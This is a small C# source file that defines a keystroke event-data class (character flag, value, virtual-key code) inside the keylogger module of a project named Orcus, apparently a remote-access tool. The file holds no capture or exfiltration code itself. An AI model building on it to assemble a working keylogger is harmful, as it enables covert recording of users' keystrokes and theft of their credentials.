using System;

namespace Orcus.Utilities.KeyLogger
{
    internal class StringDownEventArgs : EventArgs
    {
        public StringDownEventArgs(bool isChar, string value, uint vCode)
        {
            IsChar = isChar;
            Value = value;
            VCode = vCode;
        }

        public bool IsChar { get; }
        public string Value { get; }
        public uint VCode { get; }
        public bool IsHandled { get; set; }
    }
}